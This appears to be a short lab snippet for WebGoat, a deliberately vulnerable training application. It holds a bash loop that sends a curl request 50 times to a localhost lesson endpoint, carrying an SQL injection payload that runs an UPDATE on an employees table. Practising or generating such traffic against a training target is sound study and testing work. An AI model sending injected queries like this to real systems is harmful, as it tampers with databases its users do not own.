#### WebGoat SQL Injection Attack Curl 

Log into WebGoat, get your JSESSIONID using your browser’s developer tools, substitute into the curl enclosed below before running it
```
for i in `seq 1 50`; do curl 'http://localhost:8080/WebGoat/SqlInjection/attack3' \

  -H 'Connection: keep-alive' \

  -H 'Accept: */*' \

  -H 'X-Requested-With: XMLHttpRequest' \

  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36' \

  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \

  -H 'Origin: http://localhost:8080' \

  -H 'Sec-Fetch-Site: same-origin' \

  -H 'Sec-Fetch-Mode: cors' \

  -H 'Sec-Fetch-Dest: empty' \

  -H 'Referer: http://localhost:8080/WebGoat/start.mvc' \

  -H 'Accept-Language: en-US,en;q=0.9' \

  -H 'Cookie: JSESSIONID=PUT_YOUR_JESSIONID_HERE; splunkweb_csrf_token_8000=18159023846143267062; token_key=18159023846143267062; experience_id=285a0507-9785-adc6-dba2-e63189e1ea3a' \

  --data-raw $'query=UPDATE+employees+SET+department+%3D+\'Sales\'+WHERE+first_name+%3D+\'Tobi\'%3B' \

  --compressed;

done
```
